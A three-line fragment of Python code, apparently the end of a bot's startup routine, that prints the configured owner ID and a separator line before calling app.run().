    print(f"  👑 Owner     : {config.OWNER_ID}")
    print(f"{'='*52}\n")
    app.run()
